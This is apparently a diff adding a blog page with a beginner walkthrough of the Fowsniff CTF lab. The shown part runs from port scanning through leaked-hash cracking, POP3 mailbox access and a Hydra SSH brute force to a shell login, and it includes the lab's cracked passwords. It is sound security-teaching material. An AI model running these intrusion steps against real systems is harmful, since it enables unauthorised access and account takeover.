+    </li>
+    <li><a href="#summary-and-key-learning-points">Summary and Key Learning Points</a>
+      <ul>
+        <li><a href="#what-we-accomplished">What We Accomplished:</a></li>
+        <li><a href="#security-lessons">Security Lessons:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-this">What is This?</a></li>
+    <li><a href="#prerequisites">Prerequisites</a></li>
+    <li><a href="#lab-setup">Lab Setup</a>
+      <ul>
+        <li><a href="#starting-the-machine">Starting the Machine</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-1-reconnaissance--enumeration">Phase 1: Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#what-is-reconnaissance">What is Reconnaissance?</a></li>
+        <li><a href="#step-1-network-scanning-with-nmap">Step 1: Network Scanning with Nmap</a></li>
+        <li><a href="#step-2-web-application-investigation">Step 2: Web Application Investigation</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-2-osint-open-source-intelligence">Phase 2: OSINT (Open Source Intelligence)</a>
+      <ul>
+        <li><a href="#what-is-osint">What is OSINT?</a></li>
+        <li><a href="#step-3-google-dorking-discovery">Step 3: Google Dorking Discovery</a></li>
+        <li><a href="#step-4-analyzing-the-password-dump">Step 4: Analyzing the Password Dump</a></li>
+        <li><a href="#step-5-cracking-password-hashes">Step 5: Cracking Password Hashes</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-3-email-protocol-exploitation">Phase 3: Email Protocol Exploitation</a>
+      <ul>
+        <li><a href="#what-is-pop3">What is POP3?</a></li>
+        <li><a href="#step-6-connecting-to-the-pop3-service">Step 6: Connecting to the POP3 Service</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-4-ssh-access">Phase 4: SSH Access</a>
+      <ul>
+        <li><a href="#what-is-ssh">What is SSH?</a></li>
+        <li><a href="#step-7-finding-who-still-uses-the-default-password">Step 7: Finding Who Still Uses the Default Password</a></li>
+        <li><a href="#step-8-ssh-connection">Step 8: SSH Connection</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-5-privilege-escalation">Phase 5: Privilege Escalation</a>
+      <ul>
+        <li><a href="#what-is-privilege-escalation">What is Privilege Escalation?</a></li>
+        <li><a href="#step-9-system-enumeration-with-linpeas">Step 9: System Enumeration with LinPEAS</a></li>
+        <li><a href="#step-10-analyzing-the-writable-script">Step 10: Analyzing the Writable Script</a></li>
+        <li><a href="#step-11-creating-a-reverse-shell">Step 11: Creating a Reverse Shell</a></li>
+        <li><a href="#step-12-triggering-the-reverse-shell">Step 12: Triggering the Reverse Shell</a></li>
+        <li><a href="#step-13-capturing-the-flag">Step 13: Capturing the Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary-and-key-learning-points">Summary and Key Learning Points</a>
+      <ul>
+        <li><a href="#what-we-accomplished">What We Accomplished:</a></li>
+        <li><a href="#security-lessons">Security Lessons:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h1 class="relative group">Fowsniff CTF - Complete Beginner&rsquo;s Walkthrough 
+    <div id="fowsniff-ctf---complete-beginners-walkthrough" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#fowsniff-ctf---complete-beginners-walkthrough" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+<h2 class="relative group">What is This? 
+    <div id="what-is-this" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-this" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Fowsniff</strong> is a beginner-friendly boot2root CTF (Capture The Flag) challenge hosted on TryHackMe. In this challenge, we&rsquo;ll learn fundamental penetration testing skills by exploiting a vulnerable Linux machine to gain root access and capture the flag.</p>
+<p><strong>What you&rsquo;ll learn:</strong></p>
+<ul>
+<li>Network scanning with Nmap</li>
+<li>Online research and Google dorking</li>
+<li>Hash cracking techniques</li>
+<li>Email protocol exploitation (POP3)</li>
+<li>SSH brute forcing</li>
+<li>Linux privilege escalation</li>
+<li>Reverse shell creation</li>
+</ul>
+
+<h2 class="relative group">Prerequisites 
+    <div id="prerequisites" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#prerequisites" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>Basic Linux command line knowledge</li>
+<li>A TryHackMe account (free)</li>
+<li>Kali Linux or similar penetration testing environment</li>
+<li>Basic understanding of IP addresses and ports</li>
+</ul>
+
+<h2 class="relative group">Lab Setup 
+    <div id="lab-setup" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#lab-setup" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Starting the Machine 
+    <div id="starting-the-machine" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#starting-the-machine" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>Log into your TryHackMe account</li>
+<li>Navigate to the Fowsniff CTF room</li>
+<li>Click &ldquo;Start Machine&rdquo; and wait for it to deploy</li>
+<li>Note the IP address assigned to your target machine (we&rsquo;ll use <code>10.10.4.101</code> in this example)</li>
+</ol>
+
+<h2 class="relative group">Phase 1: Reconnaissance &amp; Enumeration 
+    <div id="phase-1-reconnaissance--enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#phase-1-reconnaissance--enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What is Reconnaissance? 
+    <div id="what-is-reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-reconnaissance" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Reconnaissance (or &ldquo;recon&rdquo;) is the process of gathering information about our target. We want to find:</p>
+<ul>
+<li>What services are running?</li>
+<li>What ports are open?</li>
+<li>What software versions are installed?</li>
+<li>Any publicly available information about the target?</li>
+</ul>
+
+<h3 class="relative group">Step 1: Network Scanning with Nmap 
+    <div id="step-1-network-scanning-with-nmap" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-network-scanning-with-nmap" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is Nmap?</strong> Nmap (Network Mapper) is a tool that scans networks to discover hosts and services. It&rsquo;s like knocking on doors to see which ones are open.</p>
+<p>Let&rsquo;s scan our target for open ports and services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -p- 10.10.4.101 -T4
+</span></span></code></pre></div><p><strong>Command breakdown:</strong></p>
+<ul>
+<li><code>nmap</code> - The network scanning tool</li>
+<li><code>-sV</code> - Version detection (tells us what software is running)</li>
+<li><code>-p-</code> - Scan all 65,535 ports (not just common ones)</li>
+<li><code>10.10.4.101</code> - Our target IP address</li>
+<li><code>-T4</code> - Timing template (faster scanning)</li>
+</ul>
+<p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-13 03:31 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-4-101.eu-west-1.compute.internal <span class="o">(</span>10.10.4.101<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65531</span> closed ports
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">110/tcp open  pop3    Dovecot pop3d
+</span></span><span class="line"><span class="cl">143/tcp open  imap    Dovecot imapd
+</span></span><span class="line"><span class="cl">MAC Address: 02:F8:7E:ED:14:65 <span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
+</span></span></code></pre></div><p><strong>What we discovered:</strong></p>
+<ul>
+<li><strong>Port 22 (SSH)</strong> - Secure Shell for remote login</li>
+<li><strong>Port 80 (HTTP)</strong> - Web server running Apache</li>
+<li><strong>Port 110 (POP3)</strong> - Email retrieval protocol</li>
+<li><strong>Port 143 (IMAP)</strong> - Another email protocol</li>
+<li><strong>Operating System:</strong> Ubuntu Linux</li>
+</ul>
+
+<h3 class="relative group">Step 2: Web Application Investigation 
+    <div id="step-2-web-application-investigation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-web-application-investigation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s check the website first. Open a web browser and navigate to:</p>
+<pre tabindex="0"><code>http://10.10.4.101
+</code></pre><p>You should see a website that appears to be temporarily unavailable or under maintenance.</p>
+<p><strong>What is Directory Fuzzing?</strong> Sometimes websites have hidden directories that aren&rsquo;t linked from the main page. We can try to find these using a technique called &ldquo;fuzzing&rdquo; - essentially guessing common directory names.</p>
+<p>Let&rsquo;s try directory fuzzing (this won&rsquo;t find much, but it&rsquo;s good practice):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.101/FUZZ
+</span></span></code></pre></div><p><strong>Command breakdown:</strong></p>
+<ul>
+<li><code>ffuf</code> - Fast web fuzzer</li>
+<li><code>-w</code> - Wordlist to use for fuzzing</li>
+<li><code>-u</code> - URL pattern (FUZZ gets replaced with words from the wordlist)</li>
+</ul>
+<p><em>Note: If you don&rsquo;t have ffuf installed, install it with: <code>sudo apt install ffuf</code></em></p>
+
+<h2 class="relative group">Phase 2: OSINT (Open Source Intelligence) 
+    <div id="phase-2-osint-open-source-intelligence" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#phase-2-osint-open-source-intelligence" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What is OSINT? 
+    <div id="what-is-osint" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-osint" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>OSINT involves gathering information from publicly available sources. Sometimes, information about our target is already available online!</p>
+
+<h3 class="relative group">Step 3: Google Dorking Discovery 
+    <div id="step-3-google-dorking-discovery" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-google-dorking-discovery" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Since the website seems to be down for maintenance, let&rsquo;s try searching online for information about &ldquo;Fowsniff&rdquo; or the company.</p>
+<p><strong>What is Google Dorking?</strong> Google dorking uses special search operators to find specific information that might not appear in normal searches.</p>
+<p>In a real scenario, you might search for:</p>
+<ul>
+<li>Company name + &ldquo;password&rdquo;</li>
+<li>Company domain + &ldquo;leak&rdquo;</li>
+<li>Employee email addresses</li>
+</ul>
+<p>For this CTF, the hint leads us to a GitHub repository: <a
+  href="https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt"
+    target="_blank"
+  >https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt</a></p>
+<p>This simulates finding a data breach dump online. Let&rsquo;s examine what we found:</p>
+
+<h3 class="relative group">Step 4: Analyzing the Password Dump 
+    <div id="step-4-analyzing-the-password-dump" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-analyzing-the-password-dump" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The GitHub link contains leaked user credentials in this format:</p>
+<pre tabindex="0"><code>username@domain:password_hash
+</code></pre><p><strong>Our discovered data:</strong></p>
+<pre tabindex="0"><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+</code></pre><p><strong>What are these hashes?</strong> The long strings after the colons are password hashes. Instead of storing passwords in plain text (which would be very insecure), systems store mathematical representations called &ldquo;hashes.&rdquo;</p>
+
+<h3 class="relative group">Step 5: Cracking Password Hashes 
+    <div id="step-5-cracking-password-hashes" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-5-cracking-password-hashes" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is Hash Cracking?</strong> We need to reverse these hashes back to the original passwords. We can use online tools or offline tools like hashcat or john.</p>
+<p>Let&rsquo;s use the online tool <strong>CrackStation</strong> (<a
+  href="https://crackstation.net"
+    target="_blank"
+  >https://crackstation.net</a>):</p>
+<ol>
+<li>Copy all the hashes (the part after the colon)</li>
+<li>Paste them into CrackStation</li>
+<li>Solve the captcha and click &ldquo;Crack Hashes&rdquo;</li>
+</ol>
+<p><strong>Our cracked credentials:</strong></p>
+<pre tabindex="0"><code>mauer@fowsniff:mailcall
+mustikka@fowsniff:bilbo101
+tegel@fowsniff:apples01
+baksteen@fowsniff:skyler22
+seina@fowsniff:scoobydoo2
+stone@fowsniff:[not cracked]
+mursten@fowsniff:carp4ever
+parede@fowsniff:orlando12
+sciana@fowsniff:07011972
+</code></pre><p>Let&rsquo;s save these in two files for later use:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a usernames file</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;mauer\nmustikka\ntegel\nbaksteen\nseina\nstone\nmursten\nparede\nsciana&#34;</span> &gt; fowsniff_usernames.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create a passwords file  </span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;mailcall\nbilbo101\napples01\nskyler22\nscoobydoo2\ncarp4ever\norlando12\n07011972&#34;</span> &gt; fowsniff_passwords.txt
+</span></span></code></pre></div>
+<h2 class="relative group">Phase 3: Email Protocol Exploitation 
+    <div id="phase-3-email-protocol-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#phase-3-email-protocol-exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What is POP3? 
+    <div id="what-is-pop3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-pop3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>POP3 (Post Office Protocol 3)</strong> is an email protocol that allows email clients to retrieve emails from a mail server. Unlike IMAP, POP3 typically downloads emails to the client and removes them from the server.</p>
+<p>Remember our Nmap scan found POP3 running on port 110. Let&rsquo;s try to access someone&rsquo;s email account!</p>
+
+<h3 class="relative group">Step 6: Connecting to the POP3 Service 
+    <div id="step-6-connecting-to-the-pop3-service" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-6-connecting-to-the-pop3-service" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is Netcat?</strong> Netcat (nc) is a networking utility that can connect to any port. It&rsquo;s like a Swiss Army knife for network connections.</p>
+<p>Let&rsquo;s try connecting to the POP3 service with one of our cracked accounts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc 10.10.4.101 <span class="m">110</span>
+</span></span></code></pre></div><p>You should see:</p>
+<pre tabindex="0"><code>+OK Welcome to the Fowsniff Corporate Mail Server!
+</code></pre><p>Now let&rsquo;s try logging in as <code>seina</code> with password <code>scoobydoo2</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">USER seina
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">PASS scoobydoo2
+</span></span><span class="line"><span class="cl">+OK Logged in.
+</span></span></code></pre></div><p>Great! We&rsquo;re in. Let&rsquo;s see what emails are available:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">LIST
+</span></span><span class="line"><span class="cl">+OK <span class="m">2</span> messages:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> <span class="m">1622</span>
+</span></span><span class="line"><span class="cl"><span class="m">2</span> <span class="m">1280</span>
+</span></span><span class="line"><span class="cl">.
+</span></span></code></pre></div><p>This shows there are 2 emails. Let&rsquo;s read the first one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">RETR <span class="m">1</span>
+</span></span></code></pre></div><p><strong>Important Email Content:</strong></p>
+<pre tabindex="0"><code>Subject: URGENT! Security EVENT!
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are &#34;in the shop,&#34; we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is &#34;S1ck3nBluff+secureshell&#34;
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we&#39;ll set it up.
+
+Thanks,
+A.J Stone
+</code></pre><p><strong>Key Discovery:</strong> We found a temporary SSH password: <code>S1ck3nBluff+secureshell</code></p>
+<p>Type <code>QUIT</code> to exit the POP3 session.</p>
+
+<h2 class="relative group">Phase 4: SSH Access 
+    <div id="phase-4-ssh-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#phase-4-ssh-access" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What is SSH? 
+    <div id="what-is-ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-ssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>SSH (Secure Shell)</strong> is a protocol for securely connecting to remote computers. It&rsquo;s like remote desktop, but command-line based.</p>
+
+<h3 class="relative group">Step 7: Finding Who Still Uses the Default Password 
+    <div id="step-7-finding-who-still-uses-the-default-password" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-7-finding-who-still-uses-the-default-password" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The email mentioned that everyone should change their SSH password. Let&rsquo;s see who hasn&rsquo;t changed it yet using <strong>Hydra</strong>.</p>
+<p><strong>What is Hydra?</strong> Hydra is a brute-force tool that tries multiple username/password combinations against various services.</p>
+<p><em>Install Hydra if you don&rsquo;t have it:</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install hydra
+</span></span></code></pre></div><p>Let&rsquo;s test the default SSH password against all usernames:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L fowsniff_usernames.txt -p <span class="s1">&#39;S1ck3nBluff+secureshell&#39;</span> ssh://10.10.4.101
+</span></span></code></pre></div><p><strong>Command breakdown:</strong></p>
+<ul>
+<li><code>hydra</code> - The brute force tool</li>
+<li><code>-L</code> - File containing usernames to try</li>
+<li><code>-p</code> - Single password to test (note the quotes due to special characters)</li>
+<li><code>ssh://10.10.4.101</code> - Target service and IP</li>
+</ul>
+<p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">9</span> tasks per <span class="m">1</span> server, overall <span class="m">9</span> tasks, <span class="m">9</span> login tries <span class="o">(</span>l:9/p:1<span class="o">)</span>, ~1 try per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://10.10.4.101:22/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.4.101   login: baksteen   password: S1ck3nBluff+secureshell
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span></code></pre></div><p>Excellent! User <code>baksteen</code> hasn&rsquo;t changed their password yet.</p>
+
+<h3 class="relative group">Step 8: SSH Connection 
+    <div id="step-8-ssh-connection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-8-ssh-connection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s connect via SSH:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh baksteen@10.10.4.101
+</span></span></code></pre></div><p>Enter the password when prompted: <code>S1ck3nBluff+secureshell</code></p>
+<p><strong>SSH Session Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">                            _____                       _  __  __  
+</span></span><span class="line"><span class="cl">      :sdddddddddddddddy+  <span class="p">|</span>  ___<span class="p">|</span>____      _____ _ __ <span class="o">(</span>_<span class="o">)</span>/ _<span class="p">|</span>/ _<span class="p">|</span>  
+</span></span><span class="line"><span class="cl">   :yNMMMMMMMMMMMMMNmhsso  <span class="p">|</span> <span class="p">|</span>_ / _ <span class="se">\ \ </span>/<span class="se">\ </span>/ / __<span class="p">|</span> <span class="s1">&#39;_ \| | |_| |_   
+</span></span></span><span class="line"><span class="cl"><span class="s1">.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+</span></span></span><span class="line"><span class="cl"><span class="s1">-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+</span></span></span><span class="line"><span class="cl"><span class="s1">-:      y.      dssssssso                ____                      
+</span></span></span><span class="line"><span class="cl"><span class="s1">-:      y.      dssssssso               / ___|___  _ __ _ __        
+</span></span></span><span class="line"><span class="cl"><span class="s1">-:      y.      dssssssso              | |   / _ \| &#39;</span>__<span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>    
+</span></span><span class="line"><span class="cl">-:      o.      dssssssso              <span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>_<span class="o">)</span> <span class="p">|</span>  _  
+</span></span><span class="line"><span class="cl">-:      o.      yssssssso               <span class="se">\_</span>___<span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span>  <span class="p">|</span> .__/  <span class="o">(</span>_<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">-:    .+mdddddddmyyyyyhy:                              <span class="p">|</span>_<span class="p">|</span>        
+</span></span><span class="line"><span class="cl">-: -odMMMMMMMMMMmhhdy/.    
+</span></span><span class="line"><span class="cl">.ohdddddddddddddho:                  Delivering Solutions
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ****  Welcome to the Fowsniff Corporate Server! **** 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">              ---------- NOTICE: ----------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Due to the recent security breach, we are running on a very minimal system.
+</span></span><span class="line"><span class="cl"> * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">baksteen@fowsniff:~$
+</span></span></code></pre></div><p>We&rsquo;re in! Let&rsquo;s explore:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">ls -la
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/home/baksteen
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> baksteen baksteen <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2018</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root     root     <span class="m">4096</span> Mar  <span class="m">9</span>  <span class="m">2018</span> ..
